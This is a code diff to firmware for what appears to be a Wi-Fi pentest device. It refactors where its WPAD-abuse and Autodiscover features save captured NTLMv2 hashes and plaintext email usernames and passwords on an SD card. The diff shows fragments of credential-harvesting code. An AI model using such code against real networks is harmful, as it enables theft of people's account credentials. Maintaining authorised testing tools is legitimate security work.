@@ -157,11 +157,10 @@ static void save_ntlm_hash(const uint8_t *raw, size_t rawLen, const IPAddress &c
     s_last_domain = domain;
     s_hash_count++;
 
-    if (sd_mount()) {
-        SD.mkdir("/poseidon");
+    if (sd_ensure_layout()) {
         /* POS-AUDIT-269 / net-009: rotate at 64 KB. */
-        sd_rotate_on_size("/poseidon/ntlm_hashes.txt", 64 * 1024);
-        File f = SD.open("/poseidon/ntlm_hashes.txt", FILE_APPEND);
+        sd_rotate_on_size(SD_NTLM_HASHES_PATH, 64 * 1024);
+        File f = SD.open(SD_NTLM_HASHES_PATH, FILE_APPEND);
         if (f) { f.println(line); f.close(); }
     }
     /* POS-AUDIT-270 / net-010: do NOT leak the captured NTLMv2 hash
@@ -331,7 +330,7 @@ void feat_wpad_abuse(void)
                 ui_text(4, BODY_Y+52, T_FG,  "user: %s", s_last_user.c_str());
                 ui_text(4, BODY_Y+62, T_FG,  "dom:  %s", s_last_domain.c_str());
             }
-            ui_text(4, BODY_Y+76, T_DIM, "/poseidon/ntlm_hashes.txt");
+            ui_text(4, BODY_Y+76, T_DIM, "credentials/ntlm_hashes.txt");
             ui_draw_status(radio_name(), "wpad");
         }
         delay(10);
@@ -451,9 +450,8 @@ static void ad_handle_client(WiFiClient &client) {
             s_ad_last_email = email;
             s_ad_last_type  = "BASIC";
 
-            if (sd_mount()) {
-                SD.mkdir("/poseidon");
-                File f = SD.open("/poseidon/autodiscover_creds.txt", FILE_APPEND);
+            if (sd_ensure_layout()) {
+                File f = SD.open(SD_CREDENTIALS_DIR "/autodiscover_creds.txt", FILE_APPEND);
                 if (f) { f.printf("BASIC|%s|%s|%s|%s\n", email.c_str(), user.c_str(), pass.c_str(), domain.c_str()); f.close(); }
             }
 
@@ -568,7 +566,7 @@ void feat_autodiscover(void)
             if (s_ad_last_user.length()) {
                 ui_text(4, BODY_Y+64, T_FG,  "last: %s [%s]", s_ad_last_user.c_str(), s_ad_last_type.c_str());
             }
-            ui_text(4, BODY_Y+78, T_DIM, "/poseidon/autodiscover_creds.txt");
+            ui_text(4, BODY_Y+78, T_DIM, "credentials/autodiscover_creds.txt");
             ui_draw_status(radio_name(), "autodsc");
         }
         delay(10);
